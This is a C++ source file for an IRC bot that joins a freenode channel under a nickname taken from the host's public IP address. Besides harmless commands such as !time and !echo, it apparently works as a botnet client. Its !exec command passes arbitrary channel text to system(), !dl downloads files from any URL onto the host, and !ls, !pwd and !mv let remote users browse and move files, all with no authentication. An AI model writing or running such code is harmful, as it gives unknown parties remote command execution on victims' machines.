#include <iostream>
#include <cstdlib>
#include <chrono>
#include <ctime>
#include <vector>
#include <boost/any.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/algorithm/string/replace.hpp>
#include <boost/filesystem.hpp>
#include <boost/algorithm/string/join.hpp>
#include <boost/date_time/posix_time/posix_time.hpp>
#include <boost/thread/thread.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/filesystem/fstream.hpp>
#include <arpa/inet.h>
#include <netinet/in.h>
#include "bot.h"
#include "httplib.h"
#include "logger.h"

using namespace std;

int main(int argc, char* argv[])
{
	try {
		// https://api.ipify.org/?format=json
		boost::asio::io_service io_service;
		client c(io_service, "api.ipify.org", "/?format=txt");
		io_service.run();
	
		clever_bot::bot bot("irc.freenode.net", "8001");
		//bot.nick("Bot-" + c.responseBody);
		bot.nick("B" + boost::replace_all_copy(c.responseBody, ".", "_"));
		bot.join("#example1");
		
		//handler to tell the time
		bot.add_read_handler([&bot](const std::string& m) {
			std::istringstream iss(m);
			std::string from, type, to, msg;
			
			iss >> from >> type >> to >> msg;
			
			if (msg == ":!time") {
				//check if private message, and reconfigre "to"
				std::string destNick;
				if(to == bot.nickname){
					destNick = from;
					boost::replace_all(destNick, ":", " ");
					boost::replace_all(destNick, "!", " ");
					std::vector<std::string> msgSenderVect;
					boost::split(msgSenderVect, destNick, boost::is_any_of(" "));
					to = msgSenderVect.at(1);
				}
				
				std::time_t now = std::chrono::system_clock::to_time_t(
					std::chrono::system_clock::now());
				
				bot.message(to, std::ctime(&now));
			}
		});

		// Directory list read handler
		bot.add_read_handler([&bot](const std::string& m) {
			std::istringstream iss(m);
			std::string from, type, to, msg, text;
			
			iss >> from >> type >> to >> msg;
			
			if (msg == ":!ls") {
				//check if private message, and reconfigre "to"
				std::string destNick;
				if(to == bot.nickname){
					destNick = from;
					boost::replace_all(destNick, ":", " ");
					boost::replace_all(destNick, "!", " ");
					std::vector<std::string> msgSenderVect;
					boost::split(msgSenderVect, destNick, boost::is_any_of(" "));
					to = msgSenderVect.at(1);
				}

				text = "";
				std::vector<std::string> my_file_list;
				while ((iss >> msg)) {
					if (!msg.empty())
					{
						namespace fs = boost::filesystem;
						fs::path my_path(msg);
						fs::directory_iterator end;
						
						std::cout << "about to list" << std::endl;
						for (fs::directory_iterator i(my_path); i != end; ++i)
						{
						    const fs::path cp = (*i);
						    my_file_list.push_back(cp.string());
						}
						
						text = boost::algorithm::join(my_file_list, "\n");
					}
				}
				
				if (text != "") {
					//bot.message(to, text);
					for(auto s : my_file_list){
						bot.message(to, s);
						//prevents bot getting kicked for excess flood
						boost::this_thread::sleep(boost::posix_time::milliseconds(300));
					}
				}
			}
		});
		
		//handler to echo back text
		bot.add_read_handler([&bot](const std::string& m) {
			std::istringstream iss(m);
			std::string from, type, to, msg, text;
			
			iss >> from >> type >> to >> msg;
			
			if (msg == ":!echo") {
				text = "";
				while ((iss >> msg)) {
					text += msg + " ";
				}
				
				if (text != "") {
					bot.message(to, text);
				}
			}
		});
		
		//handler to return an random number
		bot.add_read_handler([&bot](const std::string& m) {
			std::istringstream iss(m);
			std::ostringstream oss;
			std::string from, type, to, msg;
			
			iss >> from >> type >> to >> msg;
			
			if (msg == ":!rand") {
				int mx, ans = std::rand();
				
				if (iss >> mx) {
					ans = ans % mx;
				}
				
				oss << ans;
				bot.message(to, from + ": " + oss.str());
			}
		});
		
		// Essential read handler - do not remove!
		// This handler is required to keep the connection alive
		bot.add_read_handler([&bot](const std::string& m) {
			std::istringstream iss(m);
			std::string type, to, text;

			iss >> type;
			if (type == "PING") {
				text = "";
				while ((iss >> to)) {
					text += to + " ";
				}
				bot.pong(text);
			}
		});

		//detect DCC attempt
		bot.add_read_handler([&bot](const std::string& m) {
			std::istringstream iss(m);
                        std::ostringstream oss;
                        std::string from, type, to, msg, command, proto, ip, port;

                        iss >> from >> type >> to >> msg >> command >> proto >> ip >> port;

                        if (type == "PRIVMSG" && to == bot.nickname) {
				if (msg == ":""\x01""DCC" && command == "CHAT" && proto == "chat") {
					LOG("DCC-type", type);
					LOG("DCC-to", to);
					LOG("DCC-msg", msg);
					LOG("DCC-command", command);
					LOG("DCC-proto", proto);
					int32_t ipInt = ntohl(std::stoi(ip));
					struct in_addr ip_addr;
					ip_addr.s_addr = ipInt;
					LOG("DCC-ipInt", inet_ntoa(ip_addr));
					int32_t portInt = std::stoi(port);
					LOG("DCC-port", std::to_string(portInt));
				}
                        }
                });

		//download HTTP GET
                bot.add_read_handler([&bot](const std::string& m) {
                        std::istringstream iss(m);
                        std::ostringstream oss;
                        std::string from, type, to, msg, url;

			iss >> from >> type >> to >> msg;
			if (msg == ":!dl") {
                                url = "";
                                while ((iss >> msg)) {
                                        url += msg + " ";
                                }
				
				size_t found = url.find_first_of(":");
				string protocol=url.substr(0,found);
				string url_new=url.substr(found+3);
				size_t found1 =url_new.find_first_of("/");
				string host =url_new.substr(0,found1);
				string path =url_new.substr(found1);
				LOG("HTTP-host", host);
				LOG("HTTP-path", path);
				
				boost::asio::io_service io_service_fileDl;
				client c(io_service_fileDl, host, path);
                		io_service_fileDl.run();
				
                                if (url != "") {
                                        bot.message(to, "Processing protocol:" + protocol + ", host:" + host + ", path:" + path);
                                }

				boost::filesystem::path file_path{boost::filesystem::current_path().string() + "/downloaded.txt"};
				std::ofstream out(file_path.string());
				LOG("FILE-path", file_path.string());
				out << c.responseBody;
				out.close();
                        }

                });

		//move file
                bot.add_read_handler([&bot](const std::string& m) {
                        std::istringstream iss(m);
                        std::ostringstream oss;
                        std::string from, type, to, msg, text, source_path, dest_path;
			
			iss >> from >> type >> to >> msg;
                        if (msg == ":!mv") {
                                text = "";
                                while ((iss >> msg)) {
                                        text += msg + " ";
                                }
				std::vector<std::string> pathList;
				boost::split(pathList, text, boost::is_any_of(","));
				source_path = pathList.at(0);
				dest_path = pathList.at(1);
				LOG("MV-src",source_path);
				LOG("MV-dst",dest_path);
				boost::filesystem::remove(dest_path);
				boost::filesystem::copy_file(source_path,dest_path,boost::filesystem::copy_option::fail_if_exists);
				boost::filesystem::remove(source_path);
			}
		});
		
		//execute process
		bot.add_read_handler([&bot](const std::string& m) {
                        std::istringstream iss(m);
                        std::ostringstream oss;
                        std::string from, type, to, msg, text, source_path, dest_path;

                        iss >> from >> type >> to >> msg;
                        if (msg == ":!exec") {
                                text = "";
                                while ((iss >> msg)) {
                                        text += msg + " ";
                                }
				system(text.c_str());
			}
		});

		//print working directory
                bot.add_read_handler([&bot](const std::string& m) {
                        std::istringstream iss(m);
                        std::ostringstream oss;
                        std::string from, type, to, msg, text, source_path, dest_path;

                        iss >> from >> type >> to >> msg;
                        if (msg == ":!pwd") {
                                text = "";
                                while ((iss >> msg)) {
                                        text += msg + " ";
                                }
				bot.message(to, boost::filesystem::current_path().string());
                        }
                });

		// Main execution
		bot.loop();
	}
	catch (const std::exception& e) {
		std::cout << e.what() << std::endl;
	}
	
	return 0;
}
